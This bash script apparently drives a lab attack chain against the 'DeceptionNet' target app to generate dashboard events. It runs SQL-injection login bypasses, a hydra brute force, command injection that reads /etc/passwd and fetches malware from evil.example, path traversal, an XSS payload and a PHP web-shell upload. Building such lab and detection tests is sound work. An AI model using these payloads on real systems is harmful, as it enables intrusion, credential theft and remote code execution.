#!/bin/bash
# Full attack chain against the DeceptionNet attack-target web app.
# Everything here generates REAL events that flow to the dashboard.
set -u
HOST="${TARGET_HOST:-attack-target}"
PORT="${TARGET_PORT:-9090}"
BASE="http://${HOST}:${PORT}"
PASSLIST="${PASSLIST:-/opt/attack/scripts/mini-pass.txt}"

echo "[*] Target: $BASE"
echo "[-] If you launched via 'docker compose up', wait ~20s so the forwarder is live."
sleep 2

echo
echo "[1] SQLi login bypass -> T1078 Valid Accounts"
curl -s -X POST "$BASE/login" --data-urlencode "username=admin'--"     --data-urlencode "password=x" >/dev/null
curl -s -X POST "$BASE/login" --data-urlencode "username=' OR 1=1 --"  --data-urlencode "password=x" >/dev/null
echo "    done"

echo
echo "[2] Credential stuffing -> T1110 Brute Force"
for u in root admin guest oracle backup; do
  curl -s -X POST "$BASE/login" -d "username=$u&password=wrongpass" >/dev/null
done
echo "    manual guesses done"

echo "[2b] Real brute force with hydra"
hydra -l admin -P "$PASSLIST" "http-post-form" \
  "$BASE/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4 >/dev/null 2>&1 \
  || echo "    (hydra skipped/failed — manual guesses above still logged)"

echo
echo "[3] Command injection -> T1033 / T1003.008"
curl -s -X POST "$BASE/ping" -d "host=127.0.0.1; whoami" >/dev/null
curl -s -X POST "$BASE/ping" -d "host=127.0.0.1; cat /etc/passwd" >/dev/null
curl -s -X POST "$BASE/ping" -d "host=127.0.0.1; wget http://evil.example/malware.sh" >/dev/null
echo "    done"

echo
echo "[4] Path traversal / LFI -> T1003.008 (severity 5.0)"
curl -s "$BASE/read?file=../../../../etc/passwd" >/dev/null
curl -s "$BASE/read?file=../../etc/portal.conf"   >/dev/null
echo "    done"

echo
echo "[5] Reflected XSS -> T1190"
curl -s "$BASE/search?q=%3Cscript%3Ealert(1)%3C/script%3E" >/dev/null
echo "    done"

echo
echo "[6] Web shell upload -> T1048.003"
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -s -F "file=@/tmp/shell.php" "$BASE/upload" >/dev/null
echo "    done"

echo
echo "[7] Service scan -> T1046"
nmap -sV -p 9090 "$HOST" >/dev/null 2>&1 || true
echo "    done"

echo
echo "[+] Attack chain finished. Open the DeceptionNet dashboard and watch the sessions roll in."
